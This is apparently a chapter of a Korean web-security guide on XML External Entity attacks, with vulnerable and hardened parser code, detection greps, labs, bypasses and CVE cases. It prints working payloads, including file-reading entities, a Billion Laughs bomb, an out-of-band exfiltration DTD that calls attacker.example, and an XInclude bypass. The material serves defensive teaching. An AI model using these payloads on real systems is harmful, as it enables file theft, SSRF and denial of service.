# XML 외부 개체 (XML External Entity, XXE)

| 레벨 | 상태 | 최종 개정 | CWE |
|---|---|---|---|
| 🟡 실무 (7절은 🔴) | 🔄 개정중 | 2026-10-22 | [CWE-611](https://cwe.mitre.org/data/definitions/611.html) · [CWE-776](https://cwe.mitre.org/data/definitions/776.html) |

> **한눈에 보기**
> XML 문서는 "이 파일을 읽어서 여기 넣어라"고 파서에게 지시할 수 있다. 파서가 그 지시를 따르면 서버 파일 읽기, 내부망 요청(SSRF), 서비스 거부가 한 번에 열린다.
> 공격자는 설정 파일과 클라우드 자격증명을 읽고, 방화벽 뒤의 서비스를 두드린다.
> 막는 핵심은 하나다. **파서에서 DTD를 끄라.** 설정 한 줄이고, 거의 모든 언어에 정확한 문자열이 있다.

## 1. 원리

XML에는 DTD(Document Type Definition)라는 문법 정의 영역이 있고, 그 안에서 **개체**(entity)를 선언할 수 있다. 개체는 매크로다. `<!ENTITY name "값">`으로 선언하면 본문의 `&name;`이 그 값으로 치환된다. 문제는 값을 **외부에서** 가져오는 외부 개체다.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

파서는 `SYSTEM` 뒤의 URI를 열어 내용을 읽고 `&xxe;` 자리에 넣는다. 그 결과가 응답에 돌아오면 파일 읽기가 된다. URI가 `http://10.0.0.5:8080/admin`이면 [SSRF](03-ssrf.md)다. 신뢰 경계는 **문서가 파서에게 I/O를 지시하는 지점**에서 무너진다. 데이터여야 할 XML이 "무엇을 읽을지"를 정하는 명령이 된 것이다.

```mermaid
flowchart LR
    U["🧑 공격자<br/>&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;"]
    A["웹 앱<br/>DocumentBuilder.parse(body)"]
    P["XML 파서<br/>DTD 처리 ON (기본값)"]
    F["파일 시스템 / 내부망<br/>file:// http:// ftp:// jar:/ "]
    U -- "입력 (신뢰 안 함)" --> A
    A --> P
    P -- "SYSTEM URI를 연다" --> F
    F -- "내용이 &xxe; 자리에" --> P
    style P fill:#fde2e2,stroke:#b00,color:#000
    linkStyle 2 stroke:#b00,stroke-width:2px
```

<figure>
<figcaption>그림 1. 파서는 문서가 시키는 대로 URI를 연다. 많은 파서가 이것을 기본값으로 켜 두고 있었고, 일부는 지금도 그렇다.</figcaption>
</figure>

### 유형

| 유형 | 결과를 어떻게 보는가 | 난이도 |
|---|---|---|
| 고전(in-band) | 개체 값이 응답 본문에 그대로 나온다 | 🟢 |
| SSRF | 개체 URI가 내부망·클라우드 메타데이터를 가리킨다. 응답은 안 보여도 요청은 간다 | 🟡 |
| Blind OOB | 응답에 아무것도 안 나온다. 파라미터 개체로 외부 DTD를 불러 파일 내용을 공격자 서버로 보낸다 | 🟡 |
| Error 기반 | 존재하지 않는 경로에 파일 내용을 섞어 오류 메시지로 읽는다 | 🟡 |
| DoS | Billion Laughs(내부 개체 지수 확장), 외부 DTD 무한 재귀, `/dev/random` 읽기 | 🟢 |

### 파라미터 개체와 OOB 추출

일반 개체는 본문에서만 쓸 수 있다. **파라미터 개체**(`<!ENTITY % name ...>`, 참조는 `%name;`)는 DTD 안에서 쓰며, 외부 DTD 파일을 통째로 불러올 수 있다. 응답에 아무것도 반영되지 않는 blind 상황에서 쓰는 도구다.

```xml
<!-- 요청 본문 -->
<!DOCTYPE foo [ <!ENTITY % ext SYSTEM "http://attacker.example/evil.dtd"> %ext; ]>
<foo/>
```

```xml
<!-- attacker.example/evil.dtd  (공격자 서버) -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/?d=%file;'>">
%eval;
%exfil;
```

파서는 `/etc/hostname`을 읽어 `%file;`에 넣고, 그것을 URL에 섞어 공격자 서버로 요청을 보낸다. 파일 내용이 공격자의 접속 로그에 찍힌다. 내부 DTD 안에서는 "개체 안에서 파라미터 개체 참조"가 금지되어 있어서 **외부 DTD**가 필요하다. 그래서 외부 DTD 로딩을 끄는 것이 blind XXE 방어의 핵심이 된다.

### Billion Laughs

외부 접근 없이 파서만으로 메모리를 소진시키는 공격이다.

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!-- ... lol9까지 -->
]>
<lolz>&lol9;</lolz>
```

10단계 × 10배이면 10억 개의 `lol`, 약 3GB다. 1KB 문서로 수 GB 메모리를 요구한다. DTD를 끄면 함께 막힌다.

## 2. 발생하는 코드 패턴

### Java (기본값이 위험하다)

```java
// ❌ 취약: JAXP 기본 설정은 DTD와 외부 개체를 모두 처리한다
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
Document doc = dbf.newDocumentBuilder().parse(request.getInputStream());
```

```java
// ✅ 안전: DTD 자체를 금지한다. 이 한 줄이면 XXE, Billion Laughs, 외부 DTD가 모두 막힌다
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// DTD가 꼭 필요한 레거시라면 (차선책) 아래 네 줄
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

StAX(`XMLInputFactory`)는 속성 이름이 다르다.

```java
// ✅ 안전 (StAX)
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
xif.setProperty("javax.xml.stream.isSupportingExternalEntities", false);
```

`SAXParserFactory`, `XMLReader`, `TransformerFactory`, `SchemaFactory`, `Unmarshaller`(JAXB), `XPathFactory`도 각각 설정이 필요하다. JAXB는 내부적으로 쓰는 `XMLReader`를 안전하게 만든 뒤 `SAXSource`로 넘겨야 한다. 정확한 조합은 [OWASP 치트시트](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)에 파서별로 정리되어 있다.

### Python

```python
# ❌ 취약: lxml은 기본적으로 개체를 해석한다
from lxml import etree
root = etree.fromstring(request.data)
```

```python
# ✅ 안전 1: 파서 옵션
parser = etree.XMLParser(resolve_entities=False, no_network=True)
root = etree.fromstring(request.data, parser)

# ✅ 안전 2: defusedxml. 표준 라이브러리와 lxml 양쪽을 감싸 DTD 관련 공격을 예외로 바꾼다
import defusedxml.ElementTree as ET
root = ET.fromstring(request.data)
```

표준 라이브러리(`xml.etree`, `xml.dom.minidom`, `xml.sax`)는 expat 기반이라 외부 개체를 가져오지 않는다. 그러나 Billion Laughs는 expat 2.4.1 미만에서 막히지 않았다. 버전을 따지기보다 `defusedxml`을 쓰는 것이 단순하다.

### PHP

```php
// ❌ 취약: LIBXML_NOENT는 "개체를 치환하라"는 뜻이다. 이름이 반대로 읽힌다
$xml = simplexml_load_string($body, 'SimpleXMLElement', LIBXML_NOENT);
```

```php
// ✅ 안전: NOENT를 쓰지 않는다. PHP 8.4+/libxml 2.13+에서는 LIBXML_NO_XXE를 명시할 수 있다
$xml = simplexml_load_string($body, 'SimpleXMLElement', LIBXML_NONET);
```

`libxml_disable_entity_loader(true)`는 오랫동안 표준 처방이었다. libxml 2.9.0부터 외부 개체 치환이 기본으로 꺼졌고, PHP 8.0에서 이 함수는 사용 중단(deprecated)됐다. 단, **PHP 8 미만**을 쓰는 코드에서 이 호출을 지우면 XXE가 다시 열린다. 버전을 확인하고 지운다.

### .NET

```csharp
// ❌ 취약: 구 .NET Framework(4.5.2 미만)의 XmlDocument는 기본 리졸버가 외부 URI를 연다
var doc = new XmlDocument();
doc.LoadXml(body);
```

```csharp
// ✅ 안전: 버전과 무관하게 명시한다
var settings = new XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit, XmlResolver = null };
using var reader = XmlReader.Create(stream, settings);
var doc = new XmlDocument { XmlResolver = null };
doc.Load(reader);
```

## 3. 탐지 방법

### 3.1 코드 리뷰 / 정적 분석

파서 생성 지점을 모두 찾고, 그 옆에 안전 설정이 있는지 본다. **설정이 없는 파서 생성이 곧 발견이다.**

```bash
# Java: 팩토리 생성은 있는데 disallow-doctype-decl이 없는 파일
grep -rlE "DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|TransformerFactory|SchemaFactory|XMLReaderFactory" --include='*.java' . \
  | xargs grep -L "disallow-doctype-decl\|SUPPORT_DTD\|ACCESS_EXTERNAL_DTD"
# Python
grep -rnE "lxml|etree\.fromstring|xml\.dom|xml\.sax|xmltodict|xmlrpc" --include='*.py' . | grep -v defusedxml
# PHP
grep -rnE "LIBXML_NOENT|simplexml_load|DOMDocument|xml_parse" --include='*.php' .
# .NET
grep -rnE "XmlDocument|XmlTextReader|XmlReader\.Create|XPathDocument|XslCompiledTransform" --include='*.cs' .
```

**Semgrep**: `p/java`, `p/python`, `p/csharp`, `p/php`에 XXE 룰이 들어 있다. 설정 누락을 패턴으로 잡는다. **CodeQL**: `java/xxe`, `py/xxe`. 입력에서 파서까지 흐름을 추적하고 안전 설정 유무를 함께 본다.

리뷰에서 놓치기 쉬운 것은 **XML인 줄 모르는 XML**이다. 아래 3.2절의 숨은 입력 목록을 코드에서도 찾는다. 파서를 직접 부르지 않고 라이브러리(Apache POI, SAML 라이브러리, SOAP 프레임워크)가 부르는 경우가 많으므로, 그 라이브러리의 버전과 XXE 이력을 확인한다.

### 3.2 동적 테스트

**1단계: XML을 받는 곳 찾기.** `Content-Type: application/xml`, `text/xml`, SOAP 엔드포인트가 분명한 경우다. 분명하지 않은 곳이 더 많다.

| 숨은 XML 입력 | 왜 XML인가 |
|---|---|
| SVG 업로드 (프로필 이미지, 아이콘) | SVG는 XML이다. 썸네일 생성기·변환기가 파싱한다 |
| DOCX, XLSX, PPTX, ODT | ZIP 안의 XML 묶음. 미리보기·텍스트 추출·import 기능이 파싱한다 |
| SOAP, WSDL | 본문이 XML. 구 시스템 연동 API에 많다 |
| SAML 응답·메타데이터 | 로그인에 XML 서명·파싱이 들어간다 |
| 설정 가져오기(import), 백업 복원 | XML 포맷인 경우 |

**2단계: 무해한 개체로 DTD 처리 여부 확인.**

```xml
<!DOCTYPE t [ <!ENTITY probe "xxe-probe-42"> ]><root>&probe;</root>
```

응답에 `xxe-probe-42`가 나오면 DTD가 켜져 있다. 오류 메시지에 "DOCTYPE is disallowed"가 나오면 막힌 것이다.

**3단계: 외부 개체 확인.** 응답에 반영되는 필드에 `SYSTEM "file:///etc/hostname"`(Linux) 또는 `file:///C:/Windows/win.ini`(Windows). 반영되는 필드가 없으면 **OOB**로 간다. `SYSTEM "http://<collaborator>/"`로 요청이 오는지 본다. 요청이 오면 blind XXE와 SSRF가 동시에 확인된 것이다.

**4단계: blind면 파라미터 개체 + 외부 DTD**(1절)로 파일 내용을 받는다. 에러 기반도 시도한다.

자동화: Burp Scanner는 1~3단계와 OOB를 Collaborator로 자동 확인한다. 숨은 XML 입력(SVG, DOCX)을 만들어 올리는 것은 사람이 한다.

## 4. 실습 🧪

### 4.1 로컬 최소 재현 (Python + lxml, 5분)

```python
# xxe_demo.py  (실습용)
from lxml import etree

doc = b"""<?xml version="1.0"?>
<!DOCTYPE t [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<t>&xxe;</t>"""

print("default :", etree.fromstring(doc).text)                                   # ❌ 호스트명이 찍힌다
safe = etree.XMLParser(resolve_entities=False, no_network=True)
print("hardened:", etree.fromstring(doc, safe).text)                             # ✅ None
```

```bash
pip install lxml && python3 xxe_demo.py
```

같은 문서를 `defusedxml.ElementTree.fromstring`에 넣으면 `EntitiesForbidden` 예외가 난다. 세 결과를 비교하면 "기본값이 위험한 파서"와 "설정"과 "래퍼"의 차이가 보인다.

### 4.2 공개 실습 환경

[PortSwigger Web Security Academy: XXE injection](https://portswigger.net/web-security/xxe)의 랩을 순서대로 푼다.

| 순서 | 랩 | 익히는 것 |
|---|---|---|
| 1 | Exploiting XXE using external entities to retrieve files | 고전 파일 읽기 |
| 2 | Exploiting XXE to perform SSRF attacks | 클라우드 메타데이터 |
| 3 | Blind XXE with out-of-band interaction | OOB 확인 |
| 4 | Blind XXE with out-of-band interaction via XML parameter entities | 일반 개체가 막혔을 때 |
| 5 | Exploiting blind XXE to exfiltrate data using a malicious external DTD | 1절의 evil.dtd |
| 6 | Exploiting blind XXE to retrieve data via error messages | 에러 기반 |
| 7 | Exploiting XInclude to retrieve files | DOCTYPE을 못 쓰는 위치 |
| 8 | Exploiting XXE via image file upload | SVG 업로드 |
| 9 | Exploiting XXE to retrieve data by repurposing a local DTD | 외부 접속이 막혔을 때 🔴 |

## 5. 익스플로잇 검증

| 단계 | 확인 | 심각도에 미치는 영향 |
|---|---|---|
| 1 | 내부 개체가 치환된다 (DTD 처리 ON) | 설정 결함. DoS 가능성 |
| 2 | `/etc/hostname` 같은 무해 파일이 읽히거나 OOB 요청이 온다 | XXE 확인. 보통 High |
| 3 | 애플리케이션 설정·키·클라우드 자격증명이 읽힌다 | 기밀성 침해. High~Critical |
| 4 | 내부 서비스(메타데이터, 관리 콘솔)에 요청이 닿는다 | SSRF 체인. 도달 범위에 따라 Critical |

2단계까지가 보통 충분하다. 3단계는 "읽힌다"의 증명을 위해 **파일 첫 줄 정도**만 가져오고, 자격증명 전체를 보고서에 싣지 않는다. 4단계는 [SSRF 장](03-ssrf.md)의 검증 절차와 허가 범위를 따른다.

## 6. 방어

| 계층 | 조치 | 효과 |
|---|---|---|
| 코드 | **DTD 금지** (`disallow-doctype-decl`, `DtdProcessing.Prohibit`, `resolve_entities=False`, `LIBXML_NOENT` 미사용) | 근본 제거. XXE·OOB·Billion Laughs 모두 |
| 코드 | DTD가 필요하면 외부 일반·파라미터 개체와 외부 DTD 로딩을 각각 끔 | 차선책 |
| 코드 | XInclude 비활성화 (`setXIncludeAware(false)`) | DTD 없이 되는 변형 차단 |
| 코드 | XML 입력 자체를 JSON으로 교체 | 공격 표면 제거 |
| 프레임워크 | `defusedxml`, Java `XMLConstants.FEATURE_SECURE_PROCESSING` + `ACCESS_EXTERNAL_DTD=""`·`ACCESS_EXTERNAL_SCHEMA=""` | 기본값으로 차단 |
| 프레임워크 | XML을 다루는 라이브러리(POI, SAML, SOAP) 최신 버전 유지 | 알려진 XXE 제거 |
| 인프라 | 웹 서버의 아웃바운드 차단 (OOB·SSRF 경로 제거), 클라우드 메타데이터 IMDSv2 | 피해 범위 축소 |
| 탐지 | 요청 본문의 `<!DOCTYPE`, `<!ENTITY`, `SYSTEM` 알림. 파서 오류 로그 | 사후 대응 |

**하지 말아야 할 것**

- 입력에서 `<!DOCTYPE` 문자열을 지우는 것. 인코딩(UTF-16, UTF-7)으로 우회된다. 파서 설정으로 막아야 한다.
- "우리는 XML API가 없다"는 판단. 3.2절의 숨은 입력을 확인하기 전까지는 모른다.
- 라이브러리 기본값 신뢰. Java JAXP는 지금도 기본값이 위험하다.

## 7. 우회 기법 🔴

| 방어 | 우회 |
|---|---|
| `<!DOCTYPE` 문자열 필터 | UTF-16·UTF-7 인코딩 문서(`<?xml version="1.0" encoding="UTF-16"?>`), 대소문자 혼합 |
| DOCTYPE 금지 (파서 설정) | XInclude: `<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/hostname" parse="text"/>` |
| XML 엔드포인트 없음 | SVG·DOCX 업로드, `Content-Type`을 `application/xml`로 바꿔 JSON 엔드포인트에 전송 |
| 외부 일반 개체만 차단 | 파라미터 개체 `%` |
| 아웃바운드 차단 (외부 DTD 불가) | 시스템에 있는 **로컬 DTD**를 불러와 그 안의 파라미터 개체를 재정의 (Arseniy Sharoglazov, 2018). 에러 기반과 결합 |
| 응답 미반영 + 아웃바운드 차단 | 에러 기반: 존재하지 않는 경로에 파일 내용을 섞어 파서 오류 메시지로 읽기 |

## 8. 실제 CVE 사례

| CVE | 제품 | 핵심 | 패치 |
|---|---|---|---|
| [CVE-2014-3660](https://nvd.nist.gov/vuln/detail/CVE-2014-3660) | libxml2 (2.9.2 미만) | 개체 치환을 꺼도 개체 확장을 막지 못함. Billion Laughs 변형으로 CPU 소진 | [libxml2 2.9.2](https://gitlab.gnome.org/GNOME/libxml2) |
| [CVE-2019-12415](https://nvd.nist.gov/vuln/detail/CVE-2019-12415) | Apache POI (4.1.1 미만) | `XSSFExportToXml`이 조작된 XLSX 안의 XML을 안전 설정 없이 파싱. 숨은 XML 입력의 전형 | [POI 보안 공지](https://poi.apache.org/security.html) |
| [CVE-2019-3773](https://nvd.nist.gov/vuln/detail/CVE-2019-3773) | Spring Web Services (2.4.3 / 3.0.4) | 신뢰할 수 없는 출처의 XML을 받을 때 XXE. SOAP 프레임워크 자체의 결함 | [Spring 권고](https://spring.io/security/cve-2019-3773) |
| [CVE-2021-23926](https://nvd.nist.gov/vuln/detail/CVE-2021-23926) | Apache XMLBeans (3.0.0 미만) | 내부 파서가 XXE 방어 속성을 설정하지 않음. POI 등 상위 라이브러리에 전파 | [XMLBeans 3.0.0](https://xmlbeans.apache.org/) |

**libxml2 (CVE-2014-3660) 에서 배울 것**: "개체 치환을 껐으니 안전하다"가 틀렸다. 치환은 꺼졌지만 파서가 개체 크기를 계산하는 과정에서 확장이 일어났다. 공개 분석 기준으로, 패치는 치환 여부와 무관하게 개체 확장 크기를 세어 한도를 넘으면 중단하도록 검사 로직을 보강했다. DTD 처리를 통째로 끄는 것이 개별 옵션 조합보다 안전한 이유다. PHP, Python lxml, Ruby Nokogiri가 모두 libxml2 위에 있으므로 영향 범위가 넓었다.

**Apache POI (CVE-2019-12415) 에서 배울 것**: 권고문 기준으로, 패치는 해당 도구의 파서 생성에 안전 설정을 적용했다. 애플리케이션은 "엑셀 파일을 받을 뿐"이었고 XML 파서를 호출한 적이 없다. 3.2절 숨은 입력 표의 DOCX·XLSX 행이 실제로 어떻게 터지는지 보여 준다.

**XMLBeans (CVE-2021-23926) 에서 배울 것**: 권고문 기준으로, 3.0.0에서 파서 생성 시 외부 개체·DTD 관련 속성을 안전하게 설정하도록 바꿨다. 라이브러리의 라이브러리에서 난 결함이다. 의존성 트리 깊은 곳의 XML 파서까지가 공격 표면이다.

## 9. 체크리스트

**코드 리뷰할 때**
- [ ] XML 파서 생성 지점마다 DTD 금지 설정이 있는가? (Java는 팩토리마다 따로)
- [ ] XInclude가 꺼져 있는가?
- [ ] SVG·오피스 문서·SAML·SOAP·RSS를 다루는 라이브러리의 버전과 XXE 이력을 확인했는가?
- [ ] PHP 8 미만이라면 `libxml_disable_entity_loader(true)`가 남아 있는가?

**테스트할 때**
- [ ] 3.2절 숨은 입력 표를 모두 확인했는가?
- [ ] 내부 개체 프로브 → 외부 개체 → OOB 순서로 시도했는가?
- [ ] JSON 엔드포인트에 `Content-Type: application/xml`을 보내 봤는가?
- [ ] 파일 업로드에 SVG를 올려 봤는가?

**배포 전**
- [ ] 웹 서버의 아웃바운드가 필요한 목적지로만 제한되는가?
- [ ] SAST에 XXE 룰이 켜져 있고 파서 생성 지점을 모두 잡는가?

## 10. 더 읽기

- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html) · [CWE-776: Billion Laughs](https://cwe.mitre.org/data/definitions/776.html)
- [OWASP XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) · 언어·파서별 정확한 설정 문자열. 이 장의 2절은 여기서 가장 흔한 것만 뽑았다
- [Python `xml` 문서: XML vulnerabilities](https://docs.python.org/3/library/xml.html#xml-vulnerabilities) · 모듈별 취약 여부 표와 defusedxml 안내
- [PHP `libxml_disable_entity_loader` 문서](https://www.php.net/manual/en/function.libxml-disable-entity-loader.php) · 사용 중단 사유
- [Microsoft, CA3075: Insecure DTD processing](https://learn.microsoft.com/dotnet/fundamentals/code-analysis/quality-rules/ca3075) · .NET 분석기 규칙과 안전한 코드
- Arseniy Sharoglazov, "Exploiting XXE with local DTD files" (2018) · 아웃바운드가 막힌 환경의 우회
- [PortSwigger Web Security Academy: XXE injection](https://portswigger.net/web-security/xxe) · 4.2절 랩

## 변경 이력

| 날짜 | 변경 | 기여자 |
|---|---|---|
| 2026-10-21 | 초안(뼈대) 작성 | @anthonynoh5202 |
| 2026-10-22 | 10섹션 전체 작성. 언어별 안전 설정 4종, 숨은 XML 입력 표, CVE 4건, lxml 재현 코드 추가 | @anthonynoh5202 |
